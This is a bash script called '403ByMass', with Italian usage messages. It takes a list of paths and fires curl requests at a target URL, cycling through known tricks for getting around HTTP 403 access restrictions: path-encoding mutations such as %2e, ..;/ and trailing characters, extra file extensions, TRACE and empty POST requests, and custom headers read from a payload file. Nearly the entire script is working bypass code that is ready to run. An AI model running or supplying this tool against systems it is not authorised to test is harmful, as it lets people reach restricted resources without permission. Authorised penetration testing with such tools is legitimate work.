#! /bin/bash

figlet 403ByMass
echo "By Morryk - rev. 1.0"

# Controlla presenza input
if [ $# -eq 0 ]
then
	echo "Usage: $0 url <path-file> <out-file>"
  echo "out-file è opzionale, di default crea un file output.txt"
	exit 1
fi

if [ $# -ne 2 ] && [ $# -ne 3 ]
then
	echo "Usage: $0 url <path-file> <out-file>"
  echo "out-file è opzionale, di default crea un file output.txt"
	exit 1
fi

if [ ! -f "$2" ] || [ ! -r "$2" ]
then
	echo "Usage: $0 url <path-file> <out-file>"
  echo "out-file è opzionale, di default crea un file output.txt"
	echo "File non leggibile"
	exit 1
fi

url="$1"
outputFile="output.txt"
if [ -n $3 ]
then
	outputFile=$3
fi

filePayload="./payload-custom-header"

while IFS= read -r path;
do

	echo "Test bypass: $path"
	echo ""
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path
	echo "  --> ${url}/${path}"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/%2e/$path
	echo "  --> ${url}/%2e/${path}"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/.
	echo "  --> ${url}/${path}/."
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url//$path//
	echo "  --> ${url}//${path}//"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/./$path/./
	echo "  --> ${url}/./${path}/./"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%20
	echo "  --> ${url}/${path}%20"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%09
	echo "  --> ${url}/${path}%09"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path?
	echo "  --> ${url}/${path}?"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.html
	echo "  --> ${url}/${path}.html"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/?anything
	echo "  --> ${url}/${path}/?anything"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path#
	echo "  --> ${url}/${path}#"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/*
	echo "  --> ${url}/${path}/*"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.php
	echo "  --> ${url}/${path}.php"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.json
	echo "  --> ${url}/${path}.json"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
	echo "  --> ${url}/${path}  -X TRACE"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$url/$path..;/"
	echo "  --> ${url}/${path}..;/"
	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $url/$path;/"
	echo "  --> ${url}/${path};/"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
	echo "  --> ${url}/${path} -X TRACE"
	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $url/$path
	echo "  --> ${url}/${path} -H Content-Length:0 -X POST"
	while IFS= read -r payload; do
		curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path $payload
		echo "  --> ${url}/${path} $payload"
	done < $filePayload
	echo "***************************************************************************************"
	echo ""
	echo ""
done < $2 | tee $outputFile
